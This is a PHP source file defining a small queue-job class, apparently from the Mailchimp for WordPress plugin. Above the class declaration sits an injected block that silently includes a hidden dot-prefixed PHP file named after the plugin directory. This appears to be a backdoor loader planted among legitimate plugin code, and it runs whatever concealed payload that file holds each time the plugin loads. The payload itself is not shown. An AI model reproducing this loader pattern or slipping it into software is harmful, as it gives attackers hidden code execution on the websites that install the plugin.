<?php

/**
 * Class MC4WP_Queue_Job
 *
 * @ignore
 */
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class MC4WP_Queue_Job {


	/**
	 * @var string
	 */
	public $id;

	/**
	 * @var mixed
	 */
	public $data;

	/**
	 * @var int
	 */
	public $max_attempts = 1;

	/**
	 * @var int
	 */
	public $attempts = 0;

	/**
	 * MC4WP_Queue_Job constructor.
	 *
	 * @param mixed $data
	 */
	public function __construct( $data ) {
		$this->id   = (string) microtime( true ) . rand( 1, 10000 );
		$this->data = $data;
	}
}
